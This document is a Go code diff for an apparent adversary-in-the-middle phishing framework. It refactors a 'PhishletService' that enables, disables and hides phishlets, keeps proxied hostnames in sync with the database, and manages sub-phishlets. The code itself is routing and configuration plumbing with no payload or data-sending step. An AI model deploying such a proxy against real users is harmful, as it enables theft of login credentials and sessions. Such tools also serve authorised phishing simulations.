@@ -1,6 +1,7 @@
 package aitm
 
 import (
+	"fmt"
 	"regexp"
 	"strings"
 	"sync"
@@ -191,22 +192,129 @@ type JSInject struct {
 }
 
 // PhishletService owns all business logic for phishlet lifecycle.
+// It is the single point of truth for which phishlets are active: every
+// enable/disable writes to the store AND updates the in-memory hostname set,
+// so the proxy router never falls out of sync with the database.
 type PhishletService struct {
 	store           PhishletStore
 	bus             EventBus
 	dns             *DNSService
-	activeHostnames sync.Map // hostname → phishlet name
+	activeHostnames sync.Map // hostname (lowercase) → struct{}
 }
 
 func NewPhishletService(store PhishletStore, bus EventBus, dns *DNSService) *PhishletService {
 	return &PhishletService{store: store, bus: bus, dns: dns}
 }
 
-func (s *PhishletService) GetActiveHostnames() map[string]string {
-	out := make(map[string]string)
-	s.activeHostnames.Range(func(key, val any) bool {
-		out[key.(string)] = val.(string)
-		return true
-	})
-	return out
+// LoadActiveFromDB populates the in-memory hostname set from the database.
+// Call once during startup, before the proxy begins accepting connections.
+func (s *PhishletService) LoadActiveFromDB() error {
+	configs, err := s.store.ListPhishletConfigs()
+	if err != nil {
+		return fmt.Errorf("loading active phishlets: %w", err)
+	}
+	for _, cfg := range configs {
+		if cfg.Enabled && cfg.Hostname != "" {
+			s.activeHostnames.Store(strings.ToLower(cfg.Hostname), struct{}{})
+		}
+	}
+	return nil
+}
+
+// Contains reports whether hostname is currently proxied by an active phishlet.
+// Satisfies proxy.HostnameSet so PhishletService can be passed directly to PhishletRouter.
+func (s *PhishletService) Contains(hostname string) bool {
+	_, ok := s.activeHostnames.Load(strings.ToLower(hostname))
+	return ok
+}
+
+// Enable marks a phishlet as active, optionally updating its hostname, base
+// domain, and DNS provider. The in-memory hostname set is updated atomically
+// so routing takes effect immediately without a restart.
+func (s *PhishletService) Enable(name, hostname, baseDomain, dnsProvider string) (*PhishletConfig, error) {
+	cfg, err := s.store.GetPhishletConfig(name)
+	if err != nil {
+		cfg = &PhishletConfig{Name: name}
+	}
+	if hostname != "" {
+		cfg.Hostname = hostname
+	}
+	if baseDomain != "" {
+		cfg.BaseDomain = baseDomain
+	}
+	if dnsProvider != "" {
+		cfg.DNSProvider = dnsProvider
+	}
+	if cfg.Hostname == "" {
+		return nil, fmt.Errorf("hostname: required")
+	}
+	cfg.Enabled = true
+	if err := s.store.SetPhishletConfig(cfg); err != nil {
+		return nil, err
+	}
+	s.activeHostnames.Store(strings.ToLower(cfg.Hostname), struct{}{})
+	return cfg, nil
+}
+
+// Disable marks a phishlet as inactive and removes it from the hostname set.
+func (s *PhishletService) Disable(name string) (*PhishletConfig, error) {
+	cfg, err := s.store.GetPhishletConfig(name)
+	if err != nil {
+		return nil, err
+	}
+	cfg.Enabled = false
+	if err := s.store.SetPhishletConfig(cfg); err != nil {
+		return nil, err
+	}
+	if cfg.Hostname != "" {
+		s.activeHostnames.Delete(strings.ToLower(cfg.Hostname))
+	}
+	return cfg, nil
+}
+
+// Hide marks a phishlet as hidden (suppressed from lure URL generation).
+// Does not affect routing — the phishlet keeps intercepting traffic.
+func (s *PhishletService) Hide(name string) (*PhishletConfig, error) {
+	cfg, err := s.store.GetPhishletConfig(name)
+	if err != nil {
+		return nil, err
+	}
+	cfg.Hidden = true
+	if err := s.store.SetPhishletConfig(cfg); err != nil {
+		return nil, err
+	}
+	return cfg, nil
+}
+
+// Unhide reverses Hide.
+func (s *PhishletService) Unhide(name string) (*PhishletConfig, error) {
+	cfg, err := s.store.GetPhishletConfig(name)
+	if err != nil {
+		return nil, err
+	}
+	cfg.Hidden = false
+	if err := s.store.SetPhishletConfig(cfg); err != nil {
+		return nil, err
+	}
+	return cfg, nil
+}
+
+// GetConfig returns the stored config for a phishlet by name.
+func (s *PhishletService) GetConfig(name string) (*PhishletConfig, error) {
+	return s.store.GetPhishletConfig(name)
+}
+
+// ListConfigs returns all stored phishlet configs.
+func (s *PhishletService) ListConfigs() ([]*PhishletConfig, error) {
+	return s.store.ListPhishletConfigs()
+}
+
+// CreateSubPhishlet persists a sub-phishlet instantiation.
+func (s *PhishletService) CreateSubPhishlet(sp *SubPhishlet) error {
+	return s.store.CreateSubPhishlet(sp)
+}
+
+// DeleteSubPhishlet removes a sub-phishlet by name.
+func (s *PhishletService) DeleteSubPhishlet(name string) error {
+	return s.store.DeleteSubPhishlet(name)
 }
